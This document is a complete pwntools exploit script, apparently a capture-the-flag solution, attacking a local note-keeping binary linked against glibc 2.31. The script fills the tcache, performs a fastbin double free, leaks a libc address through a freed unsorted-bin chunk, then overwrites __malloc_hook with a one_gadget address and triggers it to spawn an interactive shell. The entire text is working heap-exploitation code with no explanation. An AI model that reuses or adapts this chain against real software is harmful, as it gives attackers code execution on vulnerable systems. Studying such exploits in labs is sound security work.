from pwn import *

def add(size, note):
	p.recvuntil(b'> \n')
	p.sendline(b'1')
	p.recvuntil(b'Size: ')
	p.sendline(str(size))
	p.recvuntil(b'content: ')
	p.sendline(note)

def show(idx):
	p.recvuntil(b'> \n')
	p.sendline(b'2')
	p.recvuntil(b'Index: ')
	p.sendline(str(idx))

def delete(idx):
	p.recvuntil(b'> \n')
	p.sendline(b'3')
	p.recvuntil(b'Index: ')
	p.sendline(str(idx))

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = process('./note')
elf = ELF('./note')
libc = ELF('/lib/x86_64-linux-gnu/libc-2.31.so')

#unsorted bin
add(0x500, b'a') #0

# fill tcache
for i in range(7):
	add(0x60, b'a') #1~7
add(0x60, b'a')#8
add(0x60, b'a')#9
delete(0)
for i in range(1, 8):
	delete(i)


# use fastbin_dup
delete(8)
delete(9)
delete(8)


#leak libc
show(0)
p.recvuntil(b'Note 0:\n')
main_arena = u64(p.recvline()[:-1] + b'\x00' * 0x2)
print("main_arena: ", hex(main_arena))
libc_base = main_arena - 0x1ecbe0
print("libc base: ", hex(libc_base))
malloc_hook = libc_base + libc.symbols['__malloc_hook']
one_gadget = libc_base + 0xe3b01

# make tcache empty
for i in range(7):
	add(0x60, b'a')

# overwrite malloc_hook
add(0x60, p64(malloc_hook))
add(0x60, b'a')
add(0x60, b'a')
add(0x60, p64(one_gadget))

# trigger one_gadget
p.recvuntil(b'> \n')
p.sendline(b'1')
p.recvuntil(b'Size: ')
p.sendline(str(0x60))

p.interactive()